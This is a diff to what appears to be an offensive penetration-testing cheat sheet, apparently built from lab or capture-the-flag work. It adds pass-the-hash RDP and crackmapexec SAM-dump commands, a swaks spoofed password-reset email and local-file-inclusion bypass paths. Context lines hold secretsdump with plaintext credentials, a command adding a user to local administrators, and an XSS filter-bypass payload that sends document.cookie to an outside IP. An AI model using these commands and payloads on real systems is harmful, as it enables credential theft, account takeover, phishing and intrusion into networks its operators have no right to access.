@@ -99,6 +99,7 @@ secretsdump.py THROWBACK.local/jeffersd:Throwback2020@10.200.3.117 -dc-ip 10.200
 
 [xfreerdp]
 xfreerdp /v:10.10.10.10 /u:admin /p:password
+xfreerdp /v:10.10.10.10 /u:administrator /pth:'NTLM'
 
 [winexe]
 winexe -U 'administrator' //10.10.10.10 'cmd.exe'
@@ -347,6 +348,7 @@ net localgroup administrators ch4rm /add
 crackmapexec smb 10.10.10.10 -u aniq -p pass.txt
 crackmapexec smb 10.200.3.1/24 -u administrator -d domain.local -H 'NTLM'
 crackmapexec smb 172.16.1.101 -u wsadmin -H '669b12a3bac275251170afbe2c5de8c2' -x 'whoami'
+crackmapexec smb 10.10.110.24 -u wsadmin -H '00000000000000000000000000000000' --sam
 
 [xss bypass]
 <SCRscriptIPT>document.location='http://10.14.3.113/ape.js?c='+document.cookie</SCRscriptIPT>
@@ -589,3 +591,16 @@ sqlmap -u 'http://example.com/?username=admin' --dbs --level 4 --risk 3 --file-w
 sqlmap -u 'http://10.10.110.124/login.php?username=admin&password=admin' --dbs --batch --level 4 --risk 3
 # with Basic Authentication
 sqlmap -u 'http://10.10.110.124/login' --form --dbs --batch --level 4 --risk 3 --headers="Authorization: Basic c3ZjX2lpczpWaW50YWdlIQ==
+
+[swaks]
+swaks --to admin@openmailbox.xyz --from david@openmailbox.xyz --header 'Subject: RESET MY PASSWORD 201324' --body 'Please reset my password' --server openmailbox.xyz
+
+[lfi:php fileststem attack vectors]
+Reference: https://www.ush.it/2009/02/08/php-filesystem-attack-vectors/
+```
+# null bytes at the end to avoid extensions
+../../../var/log/something.log%00
+# avoid black listed extensions or words
+ciccio.php/.
+ciccio.php/
+```
